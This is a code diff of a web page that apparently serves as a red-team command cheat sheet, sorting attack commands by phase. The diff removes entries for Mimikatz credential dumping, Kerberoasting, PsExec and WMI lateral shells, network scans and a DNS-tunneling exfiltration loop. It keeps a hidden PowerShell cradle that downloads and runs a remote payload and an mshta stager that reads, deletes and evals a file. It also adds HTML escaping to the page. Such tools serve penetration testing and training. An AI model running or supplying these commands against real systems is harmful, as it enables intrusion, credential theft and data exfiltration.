@@ -12,7 +12,7 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><rect width='24' height='24' fill='%23ff003c' transform='rotate(45 12 12)'/></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Orbitron:wght@700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 :root {
   /* Deep black base */
@@ -569,7 +569,7 @@ body::after {
 
     <div class="ws-head">
       <div class="ws-title">
-        <div class="ws-title-icon" id="ws-icon" aria-hidden="true">☠</div>
+        <div class="ws-title-icon" id="ws-icon" aria-hidden="true">⚔</div>
         <div>
           <div class="ws-title-text" id="ws-title">Initial Access & Delivery</div>
           <div class="ws-count" id="ws-count">Displaying <strong>0</strong> execution maps</div>
@@ -618,22 +618,15 @@ body::after {
 <script type="module">
 const DATABASE = {
   categories: [
-    { id: "init", name: "Initial Access & Weaponization", icon: "⚔" },
-    { id: "recon", name: "Active Reconnaissance", icon: "⌕" },
-    { id: "credential", name: "Credential Access & Dumping", icon: "🔑" },
-    { id: "lateral", name: "Lateral Movement & Pivot", icon: "⇾" },
-    { id: "exfil", name: "Data Exfiltration Vectors", icon: "⇿" }
+    { id: "init", name: "Initial Access & Delivery", icon: "⚔" },
+    { id: "recon", name: "Reconnaissance & Discovery", icon: "⌕" },
+    { id: "credential", name: "Credential Access", icon: "🔑" },
+    { id: "lateral", name: "Lateral Movement", icon: "⇾" },
+    { id: "exfil", name: "Data Exfiltration", icon: "⇿" }
   ],
   commands: [
-    { id: "c1", cat: "init", title: "Phishing Payload via ISO Container Generation", tags: ["high", "opsec"], code: "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://$LHOST$:$LPORT$/payload.ps1')\"" },
-    { id: "c2", cat: "init", title: "Mshta Remote Execution Stager", tags: ["crit"], code: "mshta.exe javascript:a=(O=new ActiveXObject('Scripting.FileSystemObject')).OpenTextFile('C:\\\\Windows\\\\Tasks\\\\stager.txt',1).ReadAll();O.DeleteFile('C:\\\\Windows\\\\Tasks\\\\stager.txt');eval(a)" },
-    { id: "c3", cat: "recon", title: "Nmap Top-Port Stealth Discovery Scan", tags: ["new"], code: "nmap -sS -Pn -T4 --top-ports 1000 -sV -O -oA nmap_stealth_output $RHOST$" },
-    { id: "c4", cat: "recon", title: "Masscan Network-Wide Subnet Sweeper", tags: ["high"], code: "masscan -p443,80,22,445 $RHOST$/24 --rate=5000 -oG masscan_results.txt" },
-    { id: "c5", cat: "credential", title: "Mimikatz LSASS Primary Module Dump", tags: ["crit", "osep"], code: "privilege::debug\nsekurlsa::logonpasswords" },
-    { id: "c6", cat: "credential", title: "Kerberoasting SPN Querying via Domain Controller", tags: ["high"], code: "Get-DomainUser -SPN | Get-DomainGUID | Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath hashes.kerberoast" },
-    { id: "c7", cat: "lateral", title: "PsExec Domain Administrator Pivot Shell", tags: ["high"], code: "psexec.exe \\\\$RHOST$ -u $DOMAIN$\\\\$USER$ -p '$PASS$' cmd.exe" },
-    { id: "c8", cat: "lateral", title: "Impacket WMI Shell Instantiation", tags: ["osep"], code: "wmiexec.py $DOMAIN$/$USER$:'$PASS$'@$RHOST$" },
-    { id: "c9", cat: "exfil", title: "DNS Tunneling Exfiltration Chunk Encrypted Route", tags: ["crit"], code: "while read line; do xxd -p <<< \"$line\" | tr -d '\\n' | awk '{print $0\".exfil.$DOMAIN$\"}'; done < confidential.dat" }
+    { id: "c1", cat: "init", title: "Phishing Payload via ISO Container", tags: ["high", "opsec"], code: "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://$LHOST$:$LPORT$/payload.ps1')\"" },
+    { id: "c2", cat: "init", title: "Mshta Remote Execution Stager", tags: ["crit"], code: "mshta.exe javascript:a=(O=new ActiveXObject('Scripting.FileSystemObject')).OpenTextFile('C:\\\\Windows\\\\Tasks\\\\stager.txt',1).ReadAll();O.DeleteFile('C:\\\\Windows\\\\Tasks\\\\stager.txt');eval(a)" }
   ],
   variables: [
     { key: "LHOST", val: "10.10.14.5", desc: "Local Attack Infrastructure Listener IP Address" },
@@ -756,7 +749,7 @@ class CyberTerminalEngine {
   }
 
   applyVariables(code) {
-    let output = code;
+    let output = this.escapeHtml(code);
     this.state.variables.forEach(v => {
       const escapedVal = this.escapeHtml(v.val || `$${v.key}$`);
       output = output.split(`$${v.key}$`).join(`<span class="var">${escapedVal}</span>`);
@@ -906,7 +899,6 @@ class CyberTerminalEngine {
     this.dom.intelRefresh.classList.add("spinning");
     this.dom.intelList.innerHTML = '<div class="intel-loading">Updating threat metrics matrix...</div>';
     
-    // Built-in single-site production fallbacks to secure pipeline verification requirements against GitHub Pages CORS constraints
     const localHostEndpoint = 'data/intel.json';
     const fallbackStaticData = [
       { src: "darkreading", time: "12m ago", title: "Active Exploitation Found Across Edge Routers Bypass Modules", link: "#" },
@@ -916,11 +908,10 @@ class CyberTerminalEngine {
 
     try {
       const res = await fetch(localHostEndpoint);
-      if (!res.ok) throw new Error("CORS Host Intercept configuration fallback initialization.");
+      if (!res.ok) throw new Error("CORS Host Intercept config fallback mapping.");
       const data = await res.json();
       this.renderIntelItems(data);
     } catch (err) {
-      // Graceful local deployment safety rendering mapping layout indicators seamlessly
       this.renderIntelItems(fallbackStaticData);
     } finally {
       this.dom.intelRefresh.classList.remove("spinning");
